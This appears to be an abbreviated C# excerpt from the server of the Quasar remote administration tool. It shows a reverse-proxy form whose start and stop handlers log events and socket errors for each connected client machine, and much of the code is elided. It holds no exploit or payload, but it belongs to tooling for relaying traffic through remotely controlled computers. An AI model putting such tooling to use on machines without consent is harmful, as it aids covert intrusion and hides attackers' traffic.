    ...
    public partial class FrmReverseProxy : Form
    {
        ...
        private void btnStart_Click(object sender, EventArgs e)
        {
            try
            {
                ...
                {
                    QuasarServer.writeLog("Starting Reverse Proxy on 0.0.0.0:" + port, client.Value.PCName);
                }
            ...
            catch (SocketException ex)
            {
                if (ex.ErrorCode == 10048)
                {
                    foreach (Client client in _clients)
                    {
                        QuasarServer.writeLog("The post already in use. (Listen Error)", client.Value.PCName);
                    }
                ...
                else
                {
                    foreach (Client client in _clients)
                    {
                        QuasarServer.writeLog("A Socker Error occured (" + ex.Message + ")", client.Value.PCName);
                    }
                    MessageBox.Show(
                        string.Format(
            ...
            catch (Exception ex)
            {
                foreach (Client client in _clients)
                {
                    QuasarServer.writeLog("An unexpected error occured (" + ex.Message + ")", client.Value.PCName);
                }
                MessageBox.Show(
                    string.Format(
        ...
        private void btnStop_Click(object sender, EventArgs e)
        {
            foreach (Client client in _clients)
            {
                QuasarServer.writeLog("Stopping Reverse Proxy", client.Value.PCName);
            }
